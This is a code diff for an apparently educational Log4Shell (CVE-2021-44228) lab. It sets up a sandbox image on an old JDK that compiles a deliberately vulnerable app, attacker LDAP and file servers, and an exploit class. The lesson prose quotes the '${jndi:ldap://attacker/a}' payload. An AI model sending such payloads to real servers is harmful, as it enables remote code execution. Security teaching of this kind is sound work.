@@ -1,33 +1,53 @@
-"""Lesson content for the Log4Shell lab.
+"""Log4Shell lab (CVE-2021-44228).
 
-The lesson is a list of blocks rendered as a notebook-style article:
-  - markdown : prose
-  - code     : a static, annotated source listing
-  - run      : an interactive cell the reader executes against their sandbox
+A tiny Java web service that logs the User-Agent header with Log4j 2.14.1 on an
+old JDK where remote JNDI class-loading still works. The reader stands up the
+attacker's LDAP + HTTP servers and fires the ${jndi:...} payload themselves.
 """
 import os
 
-SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "lab", "src")
-SRC = os.path.abspath(SRC)
+import modal
 
+SLUG = "log4shell"
+APP_NAME = "piy-log4shell"
+SANDBOX_TIMEOUT = 900
 
-def _read(name: str) -> str:
-    with open(os.path.join(SRC, name), "r") as f:
-        return f.read()
-
+_LAB = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "lab"))
+_SRC = os.path.join(_LAB, "src")
 
 VICTIM_CP = "/lab/build:/lab/jars/*:/lab/config"
 ATTACKER_CP = "/lab/build:/lab/jars/*"
 
 
+def _read(name: str) -> str:
+    with open(os.path.join(_SRC, name), "r") as f:
+        return f.read()
+
+
+def build_image() -> modal.Image:
+    return (
+        modal.Image.from_registry("openjdk:8u181-jdk-stretch", add_python=None)
+        .add_local_dir(os.path.join(_LAB, "jars"), "/lab/jars", copy=True)
+        .add_local_dir(_SRC, "/lab/src", copy=True)
+        .run_commands(
+            "mkdir -p /lab/build /lab/www /lab/config",
+            "cp /lab/src/log4j2.xml /lab/config/",
+            "javac -cp '/lab/jars/*' -d /lab/build /lab/src/VulnerableApp.java",
+            "javac -cp '/lab/jars/*' -d /lab/build /lab/src/LDAPRefServer.java /lab/src/FileServer.java",
+            "javac -d /lab/www /lab/src/Exploit.java",
+        )
+    )
+
+
+def summary() -> dict:
+    return {"slug": SLUG, "title": "Log4Shell",
+            "subtitle": "How one logged string turned into remote code execution on half the internet.",
+            "cve": "CVE-2021-44228", "meta": "Apache Log4j 2 · disclosed December 2021 · CVSS 10.0"}
+
+
 def build_lesson() -> dict:
-    return {
-        "slug": "log4shell",
-        "title": "Log4Shell",
-        "subtitle": "How one logged string turned into remote code execution on half the internet.",
-        "cve": "CVE-2021-44228",
-        "meta": "Apache Log4j 2 · disclosed December 2021 · CVSS 10.0",
-        "blocks": [
+    s = summary()
+    s["blocks"] = [
             {"type": "markdown", "content": (
                 "In December 2021 a single line of text — `${jndi:ldap://attacker/a}` — was enough to run "
                 "arbitrary code on servers running **Apache Log4j 2**, one of the most widely used logging "
@@ -140,5 +160,5 @@ def build_lesson() -> dict:
                 "blocked. The durable lesson: never let untrusted input reach an interpreter you didn't know you "
                 "had — even your logger."
             )},
-        ],
-    }
+    ]
+    return s
